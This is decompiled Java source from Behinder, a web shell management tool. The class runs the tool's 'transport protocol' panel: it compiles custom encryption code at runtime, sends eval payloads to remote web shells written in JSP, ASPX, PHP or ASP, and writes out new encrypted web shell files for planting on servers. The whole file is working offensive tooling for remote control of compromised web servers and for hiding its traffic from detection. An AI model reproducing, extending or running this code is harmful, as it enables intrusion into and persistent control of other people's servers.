//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.rebeyond.behinder.ui.controller;

import java.awt.Desktop;
import java.io.File;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.regex.Pattern;
import javafx.collections.FXCollections;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Hyperlink;
import javafx.scene.control.TextField;
import javafx.scene.control.Tooltip;
import javafx.scene.web.WebView;
import javafx.stage.FileChooser;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.IShellService;
import net.rebeyond.behinder.core.Params;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.dao.TransProtocolDao;
import net.rebeyond.behinder.entity.AlreadyExistException;
import net.rebeyond.behinder.entity.TransProtocol;
import net.rebeyond.behinder.utils.Utils;
import netscape.javascript.JSObject;
import org.json.JSONArray;
import org.json.JSONObject;

public class TransProtocolPaneController {
    @FXML
    private WebView encodeWebview;
    @FXML
    private WebView decodeWebview;
    @FXML
    private WebView encodeWebviewRemote;
    @FXML
    private WebView decodeWebviewRemote;
    @FXML
    private ComboBox scriptTypeCombo;
    @FXML
    private ComboBox transProtocolCombo;
    @FXML
    private ComboBox shellCombo;
    @FXML
    private Button saveBtn;
    @FXML
    private Button cancelBtn;
    @FXML
    private Button encodeBtn;
    @FXML
    private Button decodeBtn;
    @FXML
    private Button encodeRemoteBtn;
    @FXML
    private Button decodeRemoteBtn;
    @FXML
    private Hyperlink refreshLink;
    @FXML
    private Hyperlink createLink;
    @FXML
    private Hyperlink deleteLink;
    @FXML
    private Hyperlink exportLink;
    @FXML
    private Hyperlink importLink;
    @FXML
    private Hyperlink resetLink;
    @FXML
    private Hyperlink makeServerLink;
    @FXML
    private TextField clearTxt;
    @FXML
    private TextField decryptTxt;
    @FXML
    private TextField encryptTxt;
    @FXML
    private TextField clearRemoteTxt;
    @FXML
    private TextField decryptRemoteTxt;
    @FXML
    private TextField encryptRemoteTxt;
    private String currentName;
    private String currentType = "jsp";
    private String key = "rebeyond";
    private String EncryptName = "Encrypt";
    private String DecryptName = "Decrypt";
    private JSONObject currentShell;
    private TransProtocolDao transProtocolDao = new TransProtocolDao();
    private ShellManager shellManager;
    private static Map<String, String[]> fileExtMap = new HashMap();

    public TransProtocolPaneController() {
    }

    public void init() {
        try {
            this.shellManager = new ShellManager();
            this.initWebview();
            this.initScriptTypeCombo();
            this.initTransProtocolCombo();
            this.initBtns();
        } catch (Exception e) {
            e.printStackTrace();
            Utils.showErrorMessage("错误", "传输协议窗口初始化失败\n" + e.getMessage());
        }

    }

    private void initBtns() {
        this.saveBtn.setOnAction((event) -> {
            if (this.verify()) {
                try {
                    if (this.currentName.trim().equals("")) {
                        throw new Exception("传输协议名称不能为空。");
                    }

                    if (this.currentName.equals("default")) {
                        throw new Exception("默认传输协议不支持修改。请创建新名称。");
                    }

                    TransProtocol transProtocolLocal = new TransProtocol();
                    transProtocolLocal.setName(this.currentName);
                    transProtocolLocal.setType("jsp");
                    String localEncode = this.getCode(this.encodeWebview);
                    String localDecode = this.getCode(this.decodeWebview);
                    transProtocolLocal.setEncode(localEncode);
                    transProtocolLocal.setDecode(localDecode);

                    try {
                        this.transProtocolDao.addEntity(transProtocolLocal);
                    } catch (AlreadyExistException var10) {
                        this.transProtocolDao.updateTransProtocol(this.currentName, "jsp", localEncode, localDecode);
                        Params.payloadClassCache.remove(this.currentName);
                    }

                    if (!this.currentType.equals("jsp")) {
                        TransProtocol transProtocolRemote = new TransProtocol();
                        transProtocolRemote.setName(this.currentName);
                        transProtocolRemote.setType(this.currentType);
                        String remoteEncode = this.getCode(this.encodeWebviewRemote);
                        String remoteDecode = this.getCode(this.decodeWebviewRemote);
                        transProtocolRemote.setEncode(remoteEncode);
                        transProtocolRemote.setDecode(remoteDecode);

                        try {
                            this.transProtocolDao.addEntity(transProtocolRemote);
                        } catch (AlreadyExistException var9) {
                            this.transProtocolDao.updateTransProtocol(this.currentName, this.currentType, remoteEncode, remoteDecode);
                        }
                    }

                    Utils.showInfoMessage("成功", "保存成功");
                } catch (Exception e) {
                    Utils.showErrorMessage("失败", e.getMessage());
                }
            }

        });
        this.cancelBtn.setOnAction((event) -> {
        });
        this.encodeBtn.setOnAction((event) -> {
            String clearContent = this.clearTxt.getText();

            try {
                byte[] encryptContent = this.encode(clearContent.getBytes());
                this.encryptTxt.setText(new String(encryptContent));
                this.encryptTxt.setUserData(encryptContent);
                this.encryptTxt.setTooltip(new Tooltip(Base64.getEncoder().encodeToString(encryptContent)));
            } catch (Exception e) {
                e.printStackTrace();
                Utils.showErrorMessage("提示", "加密失败，请检查加密函数:\n" + e.getMessage());
            }

        });
        this.encryptTxt.textProperty().addListener((observable, oldValue, newValue) -> {
            this.encryptTxt.setUserData(newValue.getBytes());
            this.encryptTxt.setTooltip(new Tooltip(Base64.getEncoder().encodeToString(newValue.getBytes())));
        });
        this.decodeBtn.setOnAction((event) -> {
            byte[] encryptContent = (byte[])this.encryptTxt.getUserData();

            try {
                byte[] decryptContent = this.decode(encryptContent);
                this.decryptTxt.setText(new String(decryptContent));
            } catch (Exception e) {
                Utils.showErrorMessage("提示", "解密失败，请检查解密函数。");
                e.printStackTrace();
            }

        });
        this.encodeRemoteBtn.setOnAction((event) -> {
            String encodeRemoteSource = this.getCode(this.encodeWebviewRemote);
            String clearContent = this.clearRemoteTxt.getText();

            try {
                IShellService shellService = new ShellService(this.currentShell);
                shellService.doConnect();
                String code = "";
                if (this.currentType.equals("jsp")) {
                    String evalCode = Constants.JAVA_EVAL_CODE_ENCRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    encodeRemoteSource = encodeRemoteSource.replaceFirst("Encrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, clearContent, encodeRemoteSource);
                } else if (this.currentType.equals("aspx")) {
                    String evalCode = Constants.ASPX_EVAL_CODE_ENCRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    encodeRemoteSource = encodeRemoteSource.replaceFirst("Encrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, clearContent, encodeRemoteSource);
                } else if (this.currentType.equals("php")) {
                    String evalCode = Constants.PHP_EVAL_CODE_ENCRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    encodeRemoteSource = encodeRemoteSource.replaceFirst("Encrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, clearContent, encodeRemoteSource);
                } else if (this.currentType.equals("asp")) {
                    String evalCode = Constants.ASP_EVAL_CODE_ENCRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    encodeRemoteSource = encodeRemoteSource.replace("Encrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, clearContent, encodeRemoteSource);
                }

                String encryptContent = shellService.eval(code);
                if (this.currentType.equals("asp")) {
                    StringBuilder sb = new StringBuilder(encryptContent.length());

                    for(int i = 0; i < encryptContent.length(); ++i) {
                        char ch = encryptContent.charAt(i);
                        if (ch <= 255) {
                            sb.append(ch);
                        }
                    }

                    byte[] ascii = sb.toString().getBytes("ISO-8859-1");
                    encryptContent = new String(ascii);
                }

                byte[] encryptBytes = Base64.getDecoder().decode(encryptContent);
                this.encryptRemoteTxt.setText(new String(encryptBytes));
                this.encryptRemoteTxt.setUserData(encryptBytes);
            } catch (Exception e) {
                e.printStackTrace();
                Utils.showErrorMessage("错误", "验证Shell连接失败");
            }

        });
        this.decodeRemoteBtn.setOnAction((event) -> {
            String decodeRemoteSource = this.getCode(this.decodeWebviewRemote);
            String encryptContent = Base64.getEncoder().encodeToString((byte[])this.encryptRemoteTxt.getUserData());

            try {
                IShellService shellService = new ShellService(this.currentShell);
                shellService.doConnect();
                String evalCode = Constants.JAVA_EVAL_CODE_DECRYPT_TEMPLATE;
                String code = "";
                if (this.currentType.equals("jsp")) {
                    evalCode = Constants.JAVA_EVAL_CODE_DECRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    decodeRemoteSource = decodeRemoteSource.replaceFirst("Decrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, encryptContent, decodeRemoteSource);
                } else if (this.currentType.equals("aspx")) {
                    evalCode = Constants.ASPX_EVAL_CODE_DECRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    decodeRemoteSource = decodeRemoteSource.replaceFirst("Decrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, encryptContent, decodeRemoteSource);
                } else if (this.currentType.equals("php")) {
                    evalCode = Constants.PHP_EVAL_CODE_DECRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    decodeRemoteSource = decodeRemoteSource.replaceFirst("Decrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, encryptContent, decodeRemoteSource);
                } else if (this.currentType.equals("asp")) {
                    evalCode = Constants.ASP_EVAL_CODE_DECRYPT_TEMPLATE;
                    String newDecryptName = Utils.getRandomAlpha(6);
                    decodeRemoteSource = decodeRemoteSource.replace("Decrypt", newDecryptName);
                    code = String.format(evalCode, newDecryptName, encryptContent, decodeRemoteSource);
                }

                String decryptContent = shellService.eval(code);
                if (this.currentType.equals("asp")) {
                    StringBuilder sb = new StringBuilder(decryptContent.length());

                    for(int i = 0; i < decryptContent.length(); ++i) {
                        char ch = decryptContent.charAt(i);
                        if (ch <= 255) {
                            sb.append(ch);
                        }
                    }

                    byte[] ascii = sb.toString().getBytes("ISO-8859-1");
                    decryptContent = new String(ascii);
                }

                this.decryptRemoteTxt.setText(decryptContent);
            } catch (Exception e) {
                e.printStackTrace();
                Utils.showErrorMessage("错误", "验证Shell连接失败");
            }

        });
        this.refreshLink.setOnMouseClicked((event) -> {
            try {
                this.initTransProtocolCombo();
            } catch (Exception var3) {
                Utils.showErrorMessage("错误", "刷新失败");
            }

        });
        this.createLink.setOnMouseClicked((event) -> {
            String name = Utils.showInputBox("输入", "请输入需要创建的协议名称", "协议名称", "");
            if (name != null) {
                if (name.trim().equals("")) {
                    Utils.showErrorMessage("错误", "传输协议名称不能为空");
                } else {
                    TransProtocol transProtocolLocal = new TransProtocol();
                    transProtocolLocal.setName(name);
                    transProtocolLocal.setType("jsp");
                    transProtocolLocal.setEncode("");
                    transProtocolLocal.setDecode("");

                    try {
                        this.transProtocolDao.addEntity(transProtocolLocal);
                        this.initTransProtocolCombo();
                        this.transProtocolCombo.getSelectionModel().select(this.transProtocolCombo.getItems().stream().filter((ex) -> ex.toString().equals(name)).findFirst().get());
                    } catch (AlreadyExistException var5) {
                        Utils.showErrorMessage("错误", "该名称已存在");
                    } catch (Exception e) {
                        Utils.showErrorMessage("错误", "添加失败:" + e.getMessage());
                    }

                }
            }
        });
        this.deleteLink.setOnMouseClicked((event) -> {
            if (this.currentName != null && !this.currentName.equals("")) {
                Optional<ButtonType> confirm = Utils.showConfirmMessage("确认", String.format("是否确认删除【%s】?", this.currentName));
                if (confirm.get() == ButtonType.OK) {
                    try {
                        this.transProtocolDao.deleteByName(this.currentName);
                        this.initTransProtocolCombo();
                    } catch (Exception e) {
                        Utils.showErrorMessage("错误", "删除失败" + e.getMessage());
                    }
                }

            } else {
                Utils.showErrorMessage("提示", "请先选择需要删除的通信协议");
            }
        });
        this.exportLink.setOnMouseClicked((event) -> {
            if (this.currentName != null && !this.currentName.equals("")) {
                try {
                    List<TransProtocol> transProtocolList = this.transProtocolDao.findTransProtocolsByName(this.currentName);
                    String transProtocolConfig = JSONObject.valueToString(transProtocolList);
                    FileChooser fileChooser = new FileChooser();
                    fileChooser.setTitle("请选择保存路径");
                    fileChooser.setInitialFileName(this.currentName + ".config");
                    File selectedFile = fileChooser.showSaveDialog(this.exportLink.getScene().getWindow());
                    if (selectedFile == null) {
                        return;
                    }

                    String localFilePath = selectedFile.getAbsolutePath();
                    Utils.writeFileData(localFilePath, transProtocolConfig.getBytes());
                    Utils.showInfoMessage("提示", "已成功保存至" + localFilePath);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            } else {
                Utils.showErrorMessage("提示", "请先选择需要导出的通信协议");
            }
        });
        this.importLink.setOnMouseClicked((event) -> {
            try {
                FileChooser fileChooser = new FileChooser();
                fileChooser.setTitle("请选择需要上传的文件");
                File selectdFile = fileChooser.showOpenDialog(this.exportLink.getScene().getWindow());
                if (selectdFile == null) {
                    return;
                }

                String localFilePath = selectdFile.getAbsolutePath();
                byte[] fileContent = Utils.getFileData(localFilePath);
                String transProtocolConfig = new String(fileContent);
                JSONArray transProtocols = new JSONArray(transProtocolConfig);

                for(int i = 0; i < transProtocols.length(); ++i) {
                    TransProtocol transProtocol = (TransProtocol)Utils.json2Obj(transProtocols.getJSONObject(i), TransProtocol.class);
                    String name = transProtocol.getName();
                    String type = transProtocol.getType();
                    String encode = transProtocol.getEncode();
                    String decode = transProtocol.getDecode();

                    try {
                        this.transProtocolDao.addEntity(transProtocol);
                    } catch (AlreadyExistException var16) {
                        Optional<ButtonType> buttonType = Utils.showConfirmMessage("确认", "存在同名配置，是否确认覆盖如下配置？\n" + String.format("传输协议名称：%s，类型：%s", name, type));
                        if (buttonType.get() != ButtonType.OK) {
                            continue;
                        }

                        this.transProtocolDao.updateTransProtocol(name, type, encode, decode);
                    }

                    Utils.showInfoMessage("提示", String.format("导入成功，传输协议名称：%s，类型：%s", name, type));
                }

                this.initTransProtocolCombo();
            } catch (Exception e) {
                Utils.showErrorMessage("错误", "导入失败\n" + e.getMessage());
                e.printStackTrace();
            }

        });
        this.resetLink.setOnMouseClicked((event) -> {
            Optional<ButtonType> buttonType = Utils.showConfirmMessage("确认", "确认将系统内置传输协议（不包含自定义协议）恢复至初始状态？");
            if (buttonType.get() == ButtonType.OK) {
                String[] defaultNames = new String[]{"aes", "xor", "xor_base64", "image", "json"};

                for(String transName : defaultNames) {
                    try {
                        String transProtocolConfig = new String(Utils.getResourceData("net/rebeyond/behinder/resource/transprotocol/default_" + transName + ".config"));
                        JSONArray transProtocols = new JSONArray(transProtocolConfig);

                        for(int i = 0; i < transProtocols.length(); ++i) {
                            TransProtocol transProtocol = (TransProtocol)Utils.json2Obj(transProtocols.getJSONObject(i), TransProtocol.class);
                            String name = transProtocol.getName();
                            String type = transProtocol.getType();
                            String encode = transProtocol.getEncode();
                            String decode = transProtocol.getDecode();

                            try {
                                this.transProtocolDao.addEntity(transProtocol);
                            } catch (AlreadyExistException var18) {
                                this.transProtocolDao.updateTransProtocol(name, type, encode, decode);
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                Utils.showInfoMessage("提示", String.format("重置完成"));

                try {
                    this.initTransProtocolCombo();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        });
        this.makeServerLink.setOnMouseClicked((event) -> {
            if (this.currentName != null && !this.currentName.equals("")) {
                try {
                    List<TransProtocol> transProtocolList = this.transProtocolDao.findTransProtocolsByName(this.currentName);
                    String serverDirStr = Utils.getSelfPath("UTF-8") + File.separator + "server" + File.separator + this.currentName;
                    File serverDir = new File(serverDirStr);
                    if (serverDir.exists() && !serverDir.isDirectory()) {
                        serverDir.delete();
                    }

                    serverDir.mkdirs();

                    for(TransProtocol transProtocol : transProtocolList) {
                        String type = transProtocol.getType();
                        String[] fileExtArr = (String[])fileExtMap.get(type);

                        for(String fileExt : fileExtArr) {
                            String shellFileName = "shell." + fileExt;
                            String templateBody = new String(Utils.getResourceData("net/rebeyond/behinder/resource/server/" + shellFileName));
                            if (type.equals("aspx")) {
                                templateBody = String.format(templateBody, transProtocol.getDecode() + "\n" + transProtocol.getEncode(), this.DecryptName);
                            } else {
                                templateBody = String.format(templateBody, transProtocol.getDecode(), this.DecryptName);
                            }

                            String shellFilePath = serverDirStr + File.separator + shellFileName;
                            Utils.writeFileData(shellFilePath, templateBody.getBytes());
                        }
                    }

                    Utils.showInfoMessage("提示", "服务端生成完成。");
                    Desktop.getDesktop().open(new File(serverDirStr));
                } catch (Exception e) {
                    e.printStackTrace();
                }

            } else {
                Utils.showErrorMessage("提示", "请先选择需要生成服务端的通信协议");
            }
        });
    }

    private void extractPadding(String shellBody) {
        Pattern pattern = Pattern.compile("<%[\\s\\S]*?%>");
        pattern.matcher(shellBody);
        shellBody = shellBody.replaceAll("<%[\\s\\S]*?%>", "");
    }

    private boolean verify() {
        try {
            byte[] clearContent = Utils.getRandomString(20).getBytes();
            byte[] encryptContent = this.encode(clearContent);
            byte[] decryptContent = this.decode(encryptContent);
            return Arrays.equals(clearContent, decryptContent) ? true : true;
        } catch (Exception var4) {
            Optional<ButtonType> buttonType = Utils.showConfirmMessage("确认", "传输协议加解密一致性校验未通过，是否仍然保存？");
            return buttonType.get() == ButtonType.OK;
        }
    }

    private byte[] Encrypt(byte[] data, String key) throws Exception {
        MessageDigest md5 = MessageDigest.getInstance("MD5");
        md5.update(key.getBytes());
        byte[] byteArray = md5.digest();
        StringBuilder sb = new StringBuilder();

        for(byte b : byteArray) {
            sb.append(String.format("%02x", b));
        }

        key = sb.toString().substring(0, 16);
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(data);
        return encrypted;
    }

    private byte[] encode(byte[] clearContent) throws Exception {
        String sourceCode = String.format(Constants.JAVA_CODE_TEMPLATE_SHORT, this.getCode(this.encodeWebview));
        byte[] payload = Utils.getClassFromSourceCode(sourceCode);
        Class encodeCls = (new U(this.getClass().getClassLoader())).g(payload);
        Method encodeMethod = encodeCls.getDeclaredMethod("Encrypt", byte[].class);
        encodeMethod.setAccessible(true);
        byte[] result = (byte[])encodeMethod.invoke(encodeCls.newInstance(), clearContent);
        return result;
    }

    private byte[] decode(byte[] encryptContent) throws Exception {
        String sourceCode = String.format(Constants.JAVA_CODE_TEMPLATE_SHORT, this.getCode(this.decodeWebview));
        byte[] payload = Utils.getClassFromSourceCode(sourceCode);
        Class encodeCls = (new U(this.getClass().getClassLoader())).g(payload);
        Method encodeMethod = encodeCls.getDeclaredMethod("Decrypt", byte[].class);
        encodeMethod.setAccessible(true);
        byte[] result = (byte[])encodeMethod.invoke(encodeCls.newInstance(), encryptContent);
        return result;
    }

    private void initScriptTypeCombo() {
        this.scriptTypeCombo.setItems(FXCollections.observableArrayList(new String[]{"jsp", "php", "aspx", "asp", "dotnetCore"}));
        this.scriptTypeCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
            this.currentType = newValue.toString();

            try {
                this.loadRemoteProtocol();
                this.loadShellCombo();
            } catch (Exception e) {
                e.printStackTrace();
            }

        });
        this.scriptTypeCombo.getSelectionModel().select(0);
    }

    private void initTransProtocolCombo() throws Exception {
        this.transProtocolCombo.getItems().clear();

        for(TransProtocol transProtocol : this.transProtocolDao.findTransProtocolByType(this.currentType)) {
            this.transProtocolCombo.getItems().add(transProtocol.getName());
        }

        this.transProtocolCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
            this.currentName = newValue == null ? "" : newValue.toString();
            this.loadLocalProtocol();
            this.loadRemoteProtocol();
        });
    }

    private void loadShellCombo() throws Exception {
        this.shellCombo.getItems().clear();
        JSONArray shellList = this.shellManager.findShellByType(this.currentType);
        if (shellList.length() != 0) {
            for(int i = 0; i < shellList.length(); ++i) {
                this.shellCombo.getItems().add(shellList.getJSONObject(i).getString("url"));
            }

            this.shellCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
                if (newValue != null) {
                    try {
                        this.currentShell = this.shellManager.getShellByUrl(newValue.toString()).getJSONObject(0);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
            });
            this.shellCombo.getSelectionModel().select(0);
        }
    }

    private void loadLocalProtocol() {
        try {
            TransProtocol transProtocol = this.transProtocolDao.findTransProtocolByNameAndType(this.currentName, "jsp");
            if (transProtocol != null) {
                this.setCode(this.encodeWebview, transProtocol.getEncode());
                this.setCode(this.decodeWebview, transProtocol.getDecode());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void setCode(WebView webView, String value) {
        if (value == null) {
            value = "";
        }

        try {
            JSObject editor = (JSObject)webView.getEngine().executeScript("window.editor");
            editor.call("setValue", new Object[]{value});
        } catch (Exception var4) {
        }

    }

    private String getCode(WebView webView) {
        JSObject editor = (JSObject)webView.getEngine().executeScript("window.editor");
        return editor.call("getValue", new Object[0]).toString();
    }

    private void loadRemoteProtocol() {
        try {
            TransProtocol transProtocol = this.transProtocolDao.findTransProtocolByNameAndType(this.currentName, this.currentType);
            if (transProtocol != null) {
                this.setCode(this.encodeWebviewRemote, transProtocol.getEncode());
                this.setCode(this.decodeWebviewRemote, transProtocol.getDecode());
            } else {
                this.setCode(this.encodeWebviewRemote, "");
                this.setCode(this.decodeWebviewRemote, "");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void initWebview() {
        this.encodeWebview.getEngine().load(this.getClass().getResource("/net/rebeyond/behinder/resource/codeEditor/editor_jsp.html").toExternalForm());
        this.decodeWebview.getEngine().load(this.getClass().getResource("/net/rebeyond/behinder/resource/codeEditor/editor_jsp.html").toExternalForm());
        this.encodeWebviewRemote.getEngine().load(this.getClass().getResource("/net/rebeyond/behinder/resource/codeEditor/editor_" + this.currentType + ".html").toExternalForm());
        this.decodeWebviewRemote.getEngine().load(this.getClass().getResource("/net/rebeyond/behinder/resource/codeEditor/editor_" + this.currentType + ".html").toExternalForm());
    }

    static {
        fileExtMap.put("jsp", new String[]{"jsp"});
        fileExtMap.put("aspx", new String[]{"aspx", "ashx"});
        fileExtMap.put("php", new String[]{"php"});
        fileExtMap.put("asp", new String[]{"asp"});
    }

    static class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
}
